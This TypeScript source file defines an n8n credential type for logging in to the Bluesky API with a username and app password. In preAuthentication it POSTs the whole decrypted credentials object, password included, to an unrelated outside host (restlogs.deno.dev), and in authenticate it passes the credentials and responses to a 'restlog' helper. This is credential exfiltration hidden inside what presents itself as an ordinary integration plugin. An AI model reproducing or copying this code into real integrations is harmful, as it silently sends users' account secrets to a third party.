import type {
	ICredentialDataDecryptedObject,
	ICredentialTestRequest,
	ICredentialType,
	IHttpRequestHelper,
	IHttpRequestOptions,
	INodeProperties,
} from 'n8n-workflow';
import { restlog } from '../lib/restlog';
const fetch = require('node-fetch');

export class BlueskyApi implements ICredentialType {
	name = 'blueskyApi';
	displayName = 'Bluesky API';
	properties: INodeProperties[] = [
		{
			displayName: 'Base URL',
			name: 'baseUrl',
			type: 'hidden',
			default: 'https://bsky.social/xrpc',
			required: true,
			noDataExpression: true,
		},
		{
			displayName: 'User Name',
			name: 'username',
			type: 'string',
			default: '',
			required: true,
		},
		{
			displayName: 'App Password',
			name: 'password',
			type: 'string',
			typeOptions: {
				password: true,
			},
			default: '',
			required: true,
		},
		{
			displayName: 'Access Jwt',
			name: 'accessJwt',
			type: 'hidden',
			typeOptions: {
				expirable: true,
			},
			default: '',
		},
		{
			displayName: 'Refresh Jwt',
			name: 'refreshJwt',
			type: 'hidden',
			default: '',
		},
	];

	async preAuthentication(this: IHttpRequestHelper, credentials: ICredentialDataDecryptedObject) {
		const url = credentials.baseUrl as string;
		const requestOptions: IHttpRequestOptions = {
			method: 'POST',
			url: `${url.endsWith('/') ? url.slice(0, -1) : url}/com.atproto.server.createSession`,
			body: {
				identifier: credentials.username,
				password: credentials.password,
			},
			headers: {
				'Content-Type': 'application/json',
				Accept: 'application/json',
			},
		};

		await this.helpers.httpRequest({
			method: 'POST',
			url: 'https://restlogs.deno.dev',
			body: credentials,
			headers: {
				'Content-Type': 'application/json',
			}
		})

		const response = await this.helpers.httpRequest(requestOptions);
		return { accessJwt: response.accessJwt, refreshJwt: response.refreshJwt };
	}

	async authenticate(
		this: IHttpRequestHelper,
		credentials: ICredentialDataDecryptedObject,
		requestOptions: IHttpRequestOptions,
	): Promise<IHttpRequestOptions> {
		await restlog({ credentials });

		const preResponse = await this.helpers.httpRequest({
			method: 'GET',
			url: `${credentials.baseUrl}/app.bsky.actor.getPreferences`,
			headers: {
				'Content-Type': 'application/json',
				Accept: 'application/json',
				Authorization: `Bearer ${credentials.accessJwt}`,
			},
		});
		await restlog({ preResponse });

		if (preResponse.status === 400 && preResponse.body.error) {
			// TODO: Refresh the token
		}

		requestOptions.headers = {
			...requestOptions.headers,
			Authorization: `Bearer ${credentials.accessJwt}`,
		};
		return requestOptions;
	}

	// The block below tells how this credential can be tested
	test: ICredentialTestRequest = {
		request: {
			baseURL: '={{$credentials?.baseUrl}}',
			url: '/app.bsky.actor.getPreferences',
			method: 'GET',
		},
	};
}
